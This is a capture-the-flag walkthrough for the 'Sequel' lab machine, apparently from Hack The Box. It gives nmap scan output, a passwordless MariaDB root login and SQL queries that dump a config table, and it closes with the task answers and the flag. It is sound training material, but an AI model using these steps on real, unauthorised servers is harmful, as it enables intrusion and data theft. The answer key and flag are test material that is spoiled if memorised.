#### Guide on SEQUEL CTF Machine

##### These are the default databases that are created automatically to support the database management system's functionality.

##### mysql: The mysql database contains system tables that store metadata and access control information. It is used for user and privilege management. 

##### information_schema: The information_schema database provides information about the database server and its schemas, tables, columns, and more. 

##### performance_schema: The performance_schema database is used for performance monitoring and diagnostics. 

##### test: The test database is for testing and experimentation.

1. During our scan, which port do we find serving MySQL?<br>
3306

	- the -F flag is used for fast scan mode. It scans the top 100 most commond tcp/udp ports.
	```bash
	nmap -F 10.129.144.109    
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 14:55 PST
	Nmap scan report for 10.129.144.109
	Host is up (0.24s latency).
	Not shown: 99 closed tcp ports (conn-refused)
	PORT     STATE SERVICE
	3306/tcp open  mysql

	Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
	```

2. What community-developed MySQL version is the target running?<br>
mariadb
	- -sC flag is used to define a script along the nmap
	```bash
	nmap -F -sC 10.129.144.109
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 15:05 PST
	Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	NSE Timing: About 98.40% done; ETC: 15:06 (0:00:01 remaining)
	Nmap scan report for 10.129.144.109
	Host is up (0.24s latency).
	Not shown: 99 closed tcp ports (conn-refused)
	PORT     STATE SERVICE
	3306/tcp open  mysql
	| mysql-info: 
	|   Protocol: 10
	|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
	|   Thread ID: 73
	|   Capabilities flags: 63486
	|   Some Capabilities: LongColumnFlag, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, Support41Auth, InteractiveClient, SupportsLoadDataLocal, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
	|   Status: Autocommit
	|   Salt: Y<`NDL0H]xfu<fmoiBK4
	|_  Auth Plugin Name: mysql_native_password

	Nmap done: 1 IP address (1 host up) scanned in 45.44 seconds
	```

3. When using the MySQL command line client, what switch do we need to use in order to specify a login username?<br>
-u

	- SHOW databases; - to show all databases
	- USE database_name - to use a database
	- SHOW tables - to show all tables of the selected database
	- SELECT * FROM table_name - to show all the contents of a table

	```bash
	mysql -h 10.129.144.109 -u root
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MariaDB connection id is 142
	Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

	MariaDB [mysql]> SHOW databases;
	+--------------------+
	| Database           |
	+--------------------+
	| htb                |
	| information_schema |
	| mysql              |
	| performance_schema |
	+--------------------+
	4 rows in set (0.241 sec)

	MariaDB [mysql]> USE htb;
	Database changed
	MariaDB [htb]> SHOW tables;

	+---------------+
	| Tables_in_htb |
	+---------------+
	| config        |
	| users         |
	+---------------+
	2 rows in set (0.244 sec)

	MariaDB [htb]> SELECT * FROM config;
	+----+-----------------------+----------------------------------+
	| id | name                  | value                            |
	+----+-----------------------+----------------------------------+
	|  1 | timeout               | 60s                              |
	|  2 | security              | default                          |
	|  3 | auto_logon            | false                            |
	|  4 | max_size              | 2M                               |
	|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
	|  6 | enable_uploads        | false                            |
	|  7 | authentication_method | radius                           |
	+----+-----------------------+----------------------------------+
	7 rows in set (0.241 sec)
	```

4. Which username allows us to log into this MariaDB instance without providing a password?<br>
root

5. In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?<br>
&ast;

6. In SQL, what symbol do we need to end each query with?<br>
;

7. There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?<br>
htb
	- from the info that we got, htb is the only database that is not a default database of MySQL, so we can assume that the flag is in there
	
8. Submit root flag<br>
7b4bec00d1a39e3dd4e021ec3d915da8
	
	
	
	

